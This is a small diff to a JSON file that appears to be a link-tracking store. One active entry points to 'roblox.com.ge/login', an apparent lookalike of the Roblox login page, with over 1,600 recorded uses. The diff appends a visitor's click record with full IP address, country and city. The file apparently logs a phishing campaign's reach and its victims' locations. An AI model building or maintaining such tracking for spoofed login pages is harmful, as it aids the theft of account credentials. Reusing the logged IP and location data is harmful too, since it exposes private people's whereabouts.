@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1660,
+    "useCount": 1661,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13448,6 +13448,14 @@
         "city": "Vila Velha",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777602691663,
+        "ip": "136.158.26.228",
+        "country": "Philippines",
+        "city": "Paranaque City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
